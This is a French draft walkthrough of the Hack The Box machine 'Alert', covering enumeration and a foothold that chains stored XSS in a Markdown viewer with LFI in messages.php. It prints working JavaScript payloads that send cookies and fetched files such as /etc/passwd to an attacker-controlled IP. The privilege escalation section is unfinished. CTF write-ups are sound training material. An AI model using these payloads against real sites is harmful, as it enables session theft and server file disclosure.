---

# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Alert — HTB Easy Writeup & Walkthrough"
linkTitle: "Alert"
slug: "alert"
date: 2026-03-21T09:36:20+01:00
#lastmod: 2026-03-21T09:36:20+01:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Writeup générique de machine CTF : documentation de la phase d'énumération, exploitation du foothold, escalade de privilèges et capture des flags. Sert de modèle structuré pour rédiger les solutions détaillées"
description: "Writeup HTB Easy combinant approche pédagogique et analyse technique, avec énumération claire, compréhension de la vulnérabilité et progression structurée jusqu’à l’escalade."
tags: ["Easy"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Alert"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Alert"
  difficulty: "Easy | Medium | Hard"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Alert> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) permet d’identifier les ports ouverts suivants :

> Note : les IP et les timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée.

```bash
# Nmap 7.98 scan initiated Sat Mar 21 09:53:00 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt alert.htb
Nmap scan report for alert.htb (10.129.231.188)
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
12227/tcp filtered unknown

# Nmap done at Sat Mar 21 09:53:07 2026 -- 1 IP address (1 host up) scanned in 6.95 seconds
```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :
- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats de cette énumération sont enregistrés dans le fichier `scans_nmap/enum_ftp_smb_scan.txt`

```bash
# mon-nmap — ENUM FTP / SMB
# Target : alert.htb
# Date   : 2026-03-21T09:53:07+01:00

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités, ce qui te permet de repérer rapidement les services à examiner en priorité.

Voici le résultat (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour alert.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "alert.htb"

# Nmap 7.98 scan initiated Sat Mar 21 09:53:07 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt alert.htb
Nmap scan report for alert.htb (10.129.231.188)
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   58.01 ms 10.10.16.1
2   7.99 ms  alert.htb (10.129.231.188)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 21 09:53:22 2026 -- 1 IP address (1 host up) scanned in 14.36 seconds
```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).

```bash
# Nmap 7.98 scan initiated Sat Mar 21 09:53:22 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt alert.htb
Nmap scan report for alert.htb (10.129.231.188)
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-title: Alert - Markdown Viewer
|_Requested resource was index.php?page=alert
| http-headers: 
|   Date: Sat, 21 Mar 2026 08:53:30 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; php: 3
|     /css/
|       css: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /css/
|   Total files found (by extension):
|_    Other: 1; css: 1; php: 3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 21 09:53:37 2026 -- 1 IP address (1 host up) scanned in 14.73 seconds
```



### Scan UDP rapide

Un scan UDP rapide est également lancé afin d’identifier d’éventuels services exposés (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated Sat Mar 21 09:53:37 2026 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt alert.htb
Nmap scan report for alert.htb (10.129.231.188)
Host is up (0.017s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

# Nmap done at Sat Mar 21 09:53:45 2026 -- 1 IP address (1 host up) scanned in 8.81 seconds
```



### Énumération des chemins web
Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb alert.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier RESULTS_SUMMARY.txt te permet alors d’identifier rapidement les chemins réellement intéressants, sans avoir à parcourir l’ensemble des logs générés par les outils.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.1

Cible        : alert.htb
Périmètre    : /
Date début   : 2026-03-21 09:57:28

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://alert.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/alert.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://alert.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/alert.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/alert.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://alert.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/alert.htb/ffuf_files.json 2>&1 | tee scans_recoweb/alert.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://alert.htb/. (CODE:302|SIZE:660)
http://alert.htb/contact.php (CODE:200|SIZE:24)
http://alert.htb/css/
http://alert.htb/css/ (CODE:301|SIZE:304)
http://alert.htb/.htaccess.bak (CODE:403|SIZE:274)
http://alert.htb/.htaccess (CODE:403|SIZE:274)
http://alert.htb/.htc (CODE:403|SIZE:274)
http://alert.htb/.ht (CODE:403|SIZE:274)
http://alert.htb/.htgroup (CODE:403|SIZE:274)
http://alert.htb/.htm (CODE:403|SIZE:274)
http://alert.htb/.html (CODE:403|SIZE:274)
http://alert.htb/.htpasswd (CODE:403|SIZE:274)
http://alert.htb/.htpasswds (CODE:403|SIZE:274)
http://alert.htb/.htuser (CODE:403|SIZE:274)
http://alert.htb/index.php (CODE:302|SIZE:660)
http://alert.htb/messages/
http://alert.htb/messages/ (CODE:301|SIZE:309)
http://alert.htb/messages.php (CODE:200|SIZE:1)
http://alert.htb/.php (CODE:403|SIZE:274)
http://alert.htb/server-status (CODE:403|SIZE:274)
http://alert.htb/server-status/ (CODE:403|SIZE:274)
http://alert.htb/uploads/
http://alert.htb/uploads/ (CODE:301|SIZE:308)
http://alert.htb/wp-forum.phps (CODE:403|SIZE:274)

=== Détails par outil ===

[DIRB]
http://alert.htb/css/
http://alert.htb/index.php (CODE:302|SIZE:660)
http://alert.htb/messages/
http://alert.htb/server-status (CODE:403|SIZE:274)
http://alert.htb/uploads/

[FFUF — DIRECTORIES]
http://alert.htb/css/ (CODE:301|SIZE:304)
http://alert.htb/messages/ (CODE:301|SIZE:309)
http://alert.htb/server-status/ (CODE:403|SIZE:274)
http://alert.htb/uploads/ (CODE:301|SIZE:308)

[FFUF — FILES]
http://alert.htb/. (CODE:302|SIZE:660)
http://alert.htb/contact.php (CODE:200|SIZE:24)
http://alert.htb/.htaccess.bak (CODE:403|SIZE:274)
http://alert.htb/.htaccess (CODE:403|SIZE:274)
http://alert.htb/.htc (CODE:403|SIZE:274)
http://alert.htb/.ht (CODE:403|SIZE:274)
http://alert.htb/.htgroup (CODE:403|SIZE:274)
http://alert.htb/.htm (CODE:403|SIZE:274)
http://alert.htb/.html (CODE:403|SIZE:274)
http://alert.htb/.htpasswd (CODE:403|SIZE:274)
http://alert.htb/.htpasswds (CODE:403|SIZE:274)
http://alert.htb/.htuser (CODE:403|SIZE:274)
http://alert.htb/index.php (CODE:302|SIZE:660)
http://alert.htb/messages.php (CODE:200|SIZE:1)
http://alert.htb/.php (CODE:403|SIZE:274)
http://alert.htb/wp-forum.phps (CODE:403|SIZE:274)
```



### Recherche de vhosts

Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.

```bash
mon-subdomains alert.htb

# Résultats dans le répertoire scans_subdomains/
#  - scans_subdomains/scan_vhosts.txt
```

Même si aucun vhost n’est détecté, ce fichier permet de confirmer que le fuzzing n’a rien révélé d’exploitable.

```bash
=== mon-subdomains alert.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.0
Date         : 2026-03-21 09:58:24
Domaine      : alert.htb
IP           : 10.129.231.188
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 1
  - statistics.alert.htb

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=301 size=311 words=28 (Host=1ibj84efoa.alert.htb)
  Baseline#2: code=301 size=311 words=28 (Host=ehbl83zc3p.alert.htb)
  Baseline#3: code=301 size=311 words=28 (Host=2xr4e6jeq7.alert.htb)
  After-redirect#1: code=200 size=966 words=66
  After-redirect#2: code=200 size=966 words=66
  After-redirect#3: code=200 size=966 words=66
  VHOST (1)
    - statistics.alert.htb



=== mon-subdomains alert.htb END ===
```



## Prise pied

Lorsque tu accèdes à `http://alert.htb`, tu arrives sur la page **“Markdown Viewer”**, qui est la première page affichée par l’application.



![Interface Markdown Viewer avec upload de fichier Markdown et bouton Browse sur alert.htb](markdown-viewer.png)

Sur cette page, un menu te permet de naviguer entre plusieurs pages :
 **Markdown Viewer**, **Contact us**, **About us** et **Donate**.

La page **Markdown Viewer** attire particulièrement l’attention, car la présence d’un bouton **“Browse”** suggère un mécanisme d’upload de fichiers Markdown.

C’est cette fonctionnalité d’upload de fichiers `.md` que tu vas explorer dans la suite de l’analyse.

### Test du rendu Markdown

Pour commencer, tu peux créer un premier fichier Markdown simple afin de comprendre comment le contenu est traité par l’application.

Par exemple, crée un fichier `test.md` avec le contenu suivant :

```markdown
# Test Markdown

Ceci est un test.Ensuite :
```

Ensuite :

1. Clique sur le bouton **“Browse”**
2. Sélectionne ton fichier `test.md`
3. Clique sur **“View Markdown”** pour uploader et afficher le contenu

Le contenu est alors affiché dans l’interface.

![Affichage du fichier test.md dans Markdown Viewer après upload sur alert.htb](view-test-md.png)



> **Note :** un bouton **“Share Markdown”** est également présent sur la page et pourrait permettre de générer un lien de partage du contenu. Cette fonctionnalité sera analysée plus loin.

Ce premier test te permet de valider que :

- les fichiers `.md` sont bien acceptés
- le contenu est interprété et rendu dans le navigateur

À ce stade, tu contrôles donc directement le contenu affiché dans la page.

### Injection XSS dans le Markdown

Maintenant que tu contrôles le contenu affiché via le fichier `.md`, l’étape suivante consiste à tester si ce contenu est correctement filtré.

Pour cela, tu peux modifier ton fichier `test.md` en y ajoutant un script simple :

```markdown
# Test XSS

<script>alert(1)</script>
```

Ensuite, répète les mêmes étapes :

1. Clique sur **“Browse”**
2. Sélectionne ton fichier `test.md`
3. Clique sur **“View Markdown”**


#### Observation du comportement

Lors de l’affichage du message, une alerte JavaScript apparaît.

![Alerte JavaScript déclenchée par une faille XSS dans Markdown Viewer sur alert.htb](xss-alert.png)

Cela signifie que le code JavaScript est exécuté directement dans ton navigateur.

#### Analyse

Ce comportement indique clairement que :

- le contenu Markdown n’est **pas correctement filtré**
- les balises `<script>` sont **interprétées par le navigateur**
- il est possible d’injecter et d’exécuter du JavaScript

Tu es donc face à une **faille XSS (Cross-Site Scripting)**, une vulnérabilité qui permet d’injecter et d’exécuter du code JavaScript dans le navigateur d’un utilisateur.

Dans ce cas, il s’agit très probablement d’une **XSS stockée (Stored XSS)**, c’est-à-dire que le code malveillant est enregistré par l’application et exécuté à chaque affichage.

#### Impact

À ce stade, tu peux :

- exécuter du JavaScript dans ton propre navigateur
- modifier dynamiquement le contenu de la page
- interagir avec l’application côté client

Mais surtout, si ce contenu est consulté par un autre utilisateur, le script s’exécutera dans **son navigateur, avec ses droits**.

Si tu parviens à faire lire ce contenu par un **administrateur**, tu pourras alors exécuter du code dans **son navigateur**, comme si tu étais **administrateur de l’application**, avec les mêmes droits et possibilités.

### Test d’exfiltration via XSS

Maintenant que tu sais que tu peux exécuter du JavaScript dans ton navigateur, tu peux tester s’il est possible d’extraire des informations depuis la page.

Une première idée consiste à récupérer les cookies de session, car ils sont utilisés par l’application pour reconnaître un utilisateur déjà connecté. Les récupérer peut donc permettre d’usurper son identité.

#### Création du fichier .md pour récupérer les cookies

Pour cela, tu peux modifier ton fichier `test.md` avec le contenu suivant :

```markdown
# Alert Test

Ceci est un test Markdown.

<script>
new Image().src="http://10.10.16.93:8000/?c="+document.cookie;
</script>
```

La ligne `new Image().src="http://10.10.x.x:8000/?c="+document.cookie;` demande au navigateur de contacter ta machine Kali en utilisant l’adresse IP `10.10.x.x` de ton interface `tun0`.

Les cookies récupérés sont ceux du site que tu es en train de consulter, ici la page du **Markdown Viewer (`visualizer.php`) sur `alert.htb`**.

Pour vérifier concrètement ce comportement, tu peux lancer un serveur sur ta machine Kali afin de visualiser les requêtes envoyées par le navigateur.

#### Récupération sur la machine Kali

Pour vérifier que les cookies sont bien envoyés vers ta machine, tu peux mettre en place un listener sur Kali.

Pour cela, lance un serveur HTTP simple sur le port 8000 :

```bash
python3 -m http.server 8000
```

Ce serveur va écouter les connexions entrantes sur ton interface `tun0`.

Recharge ensuite ton fichier Markdown dans l’application.

Dans le terminal où le serveur est lancé, tu observes une requête entrante :

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.x.x - - [27/Mar/2026 10:44:40] "GET /?c= HTTP/1.1" 200 -
```

La requête est bien reçue par ton serveur, ce qui confirme que le script est exécuté et que le navigateur contacte ta machine.

On remarque également que l’adresse IP affichée (`10.10.x.x`) correspond à ta propre machine (interface `tun0`).

Cela prouve que c’est bien **ton navigateur** qui exécute le script et envoie la requête vers ton serveur.

Cependant, la valeur du paramètre `c` est vide : aucun cookie n’est envoyé dans ce cas.

Cela s’explique par le fait que tu es actuellement dans un contexte non authentifié ou sans cookie exploitable.

Le mécanisme fonctionne donc correctement, mais il faudra exécuter ce code dans un contexte plus intéressant, par exemple celui d’un administrateur, pour récupérer des informations utiles.

------

### Passage au contexte administrateur

Pour exploiter pleinement la faille XSS, l’objectif est maintenant de faire exécuter ton code dans le navigateur d’un utilisateur ayant plus de privilèges, comme un administrateur.

Sur la page **About us**, on trouve l’information suivante :

![Page About us indiquant que l’administrateur consulte les messages de contact sur alert.htb](about-us.png)

Cette mention indique que **l’administrateur est en charge de lire les messages envoyés via le formulaire de contact**.

Cela signifie que si tu parviens à lui faire consulter ton contenu Markdown, ton code JavaScript sera exécuté dans **son navigateur**.

#### Génération du lien de partage

Sur la page **Markdown Viewer**, après avoir uploadé ton fichier, un bouton **“Share Markdown”** permet de générer un lien de partage.

![Lien Share Markdown généré pour un fichier md contenant une XSS sur alert.htb](share-md.png)

Tu obtiens alors une URL de ce type :

```text
http://alert.htb/visualizer.php?link_share=69c656ef2cd5a2.66364523.md
```

Ce lien permet d’accéder directement au contenu que tu as injecté.

#### Envoi du lien via le formulaire de contact

Tu peux maintenant utiliser la page **Contact us** pour envoyer ce lien à l’administrateur.

![Formulaire Contact us sur alert.htb avec lien Share Markdown contenant une XSS prêt à être envoyé à l’administrateur](contact-us.png)

Après envoi du message, l’application confirme :

```text
Message sent successfully!
```

#### Exécution côté administrateur

Quelques instants plus tard, une nouvelle requête apparaît dans ton listener :

```bash
10.129.x.x - - [date] "GET /?c= HTTP/1.1" 200 -
```

Contrairement au test précédent, **l’adresse IP n’est plus la tienne, mais celle de la cible.**

Cela signifie que :

- le lien a été consulté par l’administrateur
- le fichier Markdown a été affiché dans **son navigateur**
- le code JavaScript s’est exécuté côté administrateur
- la requête a été envoyée depuis sa machine vers la tienne

Tu es donc parvenu à faire exécuter ton code dans le navigateur de l’administrateur, ce qui confirme l’exploitation d’une **XSS stockée dans un contexte privilégié**.



------

### Exfiltration de contenu avec JavaScript

Concrètement, l’idée est d’utiliser le navigateur de l’administrateur pour afficher des pages auxquelles toi tu n’as pas accès.

Puisque ton code JavaScript s’exécute dans son navigateur, tu peux lui faire ouvrir ces pages à ta place. Le contenu s’affiche alors dans son navigateur, avec ses droits.

Ton code peut ensuite lire ce contenu, puis l’envoyer vers ta machine.

L’objectif est donc de trouver une page intéressante à cibler afin de faire apparaître des fichiers sensibles dans le navigateur de l’administrateur.

#### Recherche d’une page intéressante à exploiter

Pour avancer, tu dois maintenant identifier une page de l’application qui pourrait afficher des fichiers ou du contenu intéressant.

Lors de la phase d’énumération, tu as découvert plusieurs pages.

L’objectif est ici de repérer une fonctionnalité qui affiche du contenu dynamique, en particulier des fichiers, car ce type de fonctionnalité peut permettre d’accéder à des informations sensibles.

Parmi les pages identifiées, `messages.php` attire l’attention, car son nom suggère qu’elle pourrait afficher du contenu stocké côté serveur.

#### Utilisation de `fetch()` pour lire une page

Tu dois maintenant trouver comment faire afficher un fichier dans le navigateur de l’administrateur, puis en récupérer le contenu.

Pour cela, tu peux utiliser `fetch()`. En JavaScript, `fetch()` permet d’envoyer une requête HTTP vers une URL et de récupérer la réponse renvoyée par le serveur. Tu peux le voir comme un `curl` exécuté directement depuis le navigateur.

Dans ton cas, l’idée est la suivante :

1. faire ouvrir une page de l’application dans le navigateur de l’administrateur ;
2. récupérer ce que cette page affiche ;
3. envoyer ces informations vers ta machine Kali.

#### Premiers essais avec `fetch()`

Une première étape consiste à vérifier que tu peux appeler la page `messages.php` depuis le navigateur de l’administrateur, puis récupérer le contenu qu’elle renvoie.

Pour cela, crée un fichier `fetch-test.md` avec le contenu suivant :

```markdown
# Test fetch

<script>
fetch('http://alert.htb/messages.php')
  .then(r => r.text())
  .then(data => {
    new Image().src = 'http://10.10.16.93:8000/?ok=' + data.length;
  })
  .catch(err => {
    new Image().src = 'http://10.10.16.93:8000/?err=1';
  });
</script>
```

Ce code fonctionne en plusieurs étapes :

- `fetch()` appelle la page `messages.php`
- `.then(r => r.text())` récupère le contenu renvoyé par le serveur
- `new Image().src` envoie ce contenu vers ta machine Kali

Tu peux ensuite uploader ce fichier, générer un lien avec **“Share Markdown”**, puis l’envoyer via la page **Contact us**.

Dans ton terminal Kali, tu observes alors une requête entrante contenant le résultat renvoyé par la page :

```bash
10.129.231.188 - - [27/Mar/2026 17:07:00] "GET /?d=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg== HTTP/1.1" 200 -
```

Le contenu est encodé en Base64. Tu peux le décoder avec la commande suivante :

```bash
echo "PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg==" | base64 -d
```

Tu obtiens alors le contenu HTML suivant :

```html
<h1>Messages</h1>
<ul>
  <li>
    <a href='messages.php?file=2024-03-10_15-48-34.txt'>
      2024-03-10_15-48-34.txt
    </a>
  </li>
</ul>
```

Ce résultat montre que la page `messages.php` affiche une liste de fichiers disponibles, avec des liens utilisant le paramètre `file`.

Ces informations ne sont pas visibles pour un utilisateur standard, mais deviennent accessibles lorsqu’elles sont récupérées depuis le navigateur de l’administrateur.

On dispose désormais d’un point d’entrée clair pour lire des fichiers via :

```bash
messages.php?file=...
```

#### Confirmation de la lecture d’un fichier

Maintenant que tu sais que la page `messages.php` permet d’afficher des fichiers via le paramètre `file`, tu peux vérifier s’il est possible de lire un fichier système.

Pour cela, crée un fichier `fetch-files.md` avec le contenu suivant :


```markdown
# Fetch files

<script>
fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
  .then(r => r.text())
  .then(data => {
    new Image().src = 'http://10.10.16.93:8000/?d=' + btoa(data);
  });
</script>
```

Ce code demande au navigateur de l’administrateur d’ouvrir le fichier `/etc/passwd`, puis d’envoyer son contenu vers ta machine Kali.

Dans ton terminal, tu observes alors une nouvelle requête contenant les données encodées.

Après décodage, tu obtiens le contenu du fichier `/etc/passwd`, par exemple :

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Cela confirme que :

- le paramètre `file` permet de lire des fichiers arbitraires
- cette lecture est effectuée avec les droits de l’administrateur
- il est possible d’exfiltrer le contenu de ces fichiers vers ta machine

Tu es donc en présence d’une vulnérabilité de type **Local File Inclusion (LFI)** exploitable via la XSS.

------

### Découverte d’un point d’entrée LFI

La réponse obtenue révèle la présence de paramètres intéressants :

```
messages.php?file=...
```

Cela suggère que l’application permet de lire des fichiers côté serveur.

On teste alors une inclusion de fichier classique :

```
../../../../etc/passwd
```

Payload final :

```
<script>
fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
  .then(r => r.text())
  .then(data => {
    new Image().src = 'http://10.10.16.93:8000/?d=' + btoa(data);
  });
</script>
```

------

### Validation de la lecture de fichiers

Après envoi du lien à l’administrateur, on reçoit sur notre serveur le contenu encodé.

Une fois décodé, on obtient :

```
root:x:0:0:root:/root:/bin/bash
...
```

👉 La vulnérabilité est confirmée :

- XSS stockée → exécution côté admin
- - LFI via `messages.php`
- = **lecture arbitraire de fichiers sur le serveur**

------

### Conclusion de la prise de pied

À ce stade, on dispose :

- d’une exécution JavaScript dans le navigateur admin
- d’un accès indirect aux fichiers du serveur
- d’un canal d’exfiltration fiable

👉 Cela constitue une **prise de pied complète côté web**, permettant d’envisager la récupération de credentials ou d’autres fichiers sensibles pour aller plus loin.

---

## Escalade de privilèges

{{< escalade-intro user="ssh_user" >}}

### Sudo -l
Tu commences toujours par vérifier les droits sudo :

### Recherche de binaires SUID
Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.

```bash
find / -perm -4000 -type f 2>/dev/null
```

La liste obtenue ne contient que des binaires système classiques tels que :

```texte
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
```

Tu n’identifies aucun binaire inhabituel ou directement exploitable.

### Analyse des Linux capabilities

Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.

La vérification se fait avec la commande suivante :

```bash
getcap -r / 2>/dev/null
```

Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.

### Inspection des tâches cron
